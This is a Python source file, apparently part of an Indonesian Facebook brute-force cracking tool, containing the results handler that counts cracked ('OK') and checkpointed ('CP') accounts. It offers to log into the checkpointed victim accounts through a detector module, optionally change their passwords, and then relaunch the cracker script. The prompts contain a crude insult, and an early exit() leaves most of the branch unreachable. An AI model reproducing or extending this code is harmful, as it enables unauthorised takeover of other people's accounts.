# coding by Romi Afrizal
from xyz import *
from xyz import detect as deteck

#--- SELESAI CRACK
ubah_pass = []
pwbaru = []
ENG = []

def hasil(ok,cp):
	try:
		eng = open("data/english.txt","r").read()
		ENG.append(eng)
	except (FileNotFoundError, IOError):
		pass
	if len(ok) != 0 or len(cp) != 0:
		tulis(Panel(f'{Te}{U} •{H} OK{M} : {H}{str(len(ok))}\n{U} •{K} CP{M} : {K}{str(len(cp))}',
		style='#FF0022'))
		if len(cp)==0:
			exit()
		exit()
		if "bahasa_inggris" in ENG:
			c = input('%s╰─%s use detector checkpoint? y/t%s > %s'%(p,o,m,k))
		else:
			c = input('%s╰─%s gunakan detektor checkpoint? y/t%s > %s'%(p,o,m,k))
		if c =='':
			if "bahasa_inggris" in ENG:
				exit("%s╰─%s choose the right one "%(p,m));jeda(2)
			else:
				exit("%s╰─%s Isi yang benar kentod "%(p,m))
		elif c in['Y','y']:
			if "bahasa_inggris" in ENG:
				tulis(Panel(f"{Te} {U}•{O} Airplane mode 5 seconds first ",style='#FF0022'))
				pw=input("%s╰─%s change one tab account password? y/t %s> %s"%(p,o,m,k))
			else:
				tulis(Panel(f"{Te} {U}•{O} Mode pesawatkan terlebih dahulu 5 detik ",style='#FF0022'))
				pw=input("%s╰─%s ubah sandi akun one tab? y/t %s> %s"%(p,o,m,k))
			if pw =='':
				if "bahasa_inggris" in ENG:
					exit("%s╰─%s choose the right one "%(p,m));jeda(2)
				else:
					print ("%s╰─%s isi yg benar kentod "%(p,m))
			elif pw in['y','Y']:
				ubah_pass.append("ubah_sandi")
				if "bahasa_inggris" in ENG:
					pw2=input("%s╰─%s enter password %s> %s"%(p,o,m,k))
				else:
					pw2=input("%s╰─%s masukan sandi %s> %s"%(p,o,m,k))
				if len(pw2) <= 5:
					if "bahasa_inggris" in ENG:
						print("%s╰─%s password minimum 6 characters "%(p,m))
					else:
						print("%s╰─%s sandi minimal 6 karakter "%(p,m))
				else:
					pwbaru.append(pw2)
			nomor=0
			for fb in cp:
				akun = fb.replace("\n","")
				ngecek  = akun.split(" ◊ ")
				nomor+=1
				if "bahasa_inggris" in ENG:
					tulis(Panel(f"{Te}{H} {str(nomor)}.{O} login account {M}> {K}{akun.replace(' *--> ','')}",style='#FF0022'))
				else:
					tulis(Panel(f"{Te}{H} {str(nomor)}.{O} login akun {M}> {K}{akun.replace(' *--> ','')}",style='#FF0022'))
				try:
					deteck.mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
				except requests.exceptions.ConnectionError:
					if "bahasa_inggris" in ENG:
						sys.stdout.write("\r%s╰─%s no connection "%(p,m)),
						sys.stdout.flush();jeda(1)
					else:
						sys.stdout.write("\r%s╰─%s tidak ada koneksi "%(p,m)),
						sys.stdout.flush();jeda(1)
					pass
				except:
					pass
			if "bahasa_inggris" in ENG:
				tulis(Panel(f"{Te}{U} •{O} Done checking account",style='#FF0022'))
			else:
				tulis(Panel(f"{Te}{U} •{O} Selesai mengecek akun",style='#FF0022'))
			input('%s╰─%s [%s Enter%s ] '%(p,o,u,o))
			os.system("python bff-2.py")
		elif c in['t','T']:
			exit()
		else:
			if "bahasa_inggris" in ENG:
				exit("%s╰─%s choose the right one "%(p,m));jeda(2)
			else:
				exit ("%s╰─%s isi yg benar kentod "%(p,m))
	else:
		if "bahasa_inggris" in ENG:
			exit(f"{p}╰─{m} Ops... getting no results :(")
		else:
			exit(f"{p}╰─{m} Ops... tidak mendapatkan hasil :(")
			